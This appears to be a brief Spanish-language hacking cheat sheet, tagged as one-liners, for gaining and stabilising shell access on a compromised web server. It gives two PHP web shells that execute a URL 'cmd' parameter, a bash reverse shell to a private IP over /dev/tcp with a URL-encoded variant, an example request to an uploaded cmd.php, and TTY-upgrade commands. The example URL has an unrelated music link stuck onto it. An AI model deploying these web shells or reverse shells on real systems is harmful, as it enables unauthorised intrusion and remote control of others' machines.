-----------------
- Tags: #oneliner #bash #scripting #comands #tools #shell #terminal #info
--------------------

- *PHP File*
```PHP
<?php
    system($_GET['cmd']);
?>
```

- *PHP preformateado*
```PHP
<?php
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

 
- **Bash**
```bash
bash -c "bash -i >& /dev/tcp/192.168.3.10/443 0>&1"
```


- *Opcion URL Encoded*
```bash
bash -c "bash -i >%26 /dev/tcp/192.168.3.226/443 0>%261"
```

---------------------------
- ### Ejemplo de Uso: 
```url
http://localhost:9001/upload1/uploads/cmd.php?cmd=whoamihttps://open.spotify.com/playlist/261SGgZEsCZqwIG7xHhyl9
```

------------------
- ### Tratamiento TTY

```bash
script /dev/null -c bash

//Ctrl Z

stty raw -echo; fg

reset xterm

export TERM=xterm

export SHELL=bash

stty rows X columns Y

stty size (43, 190)
```
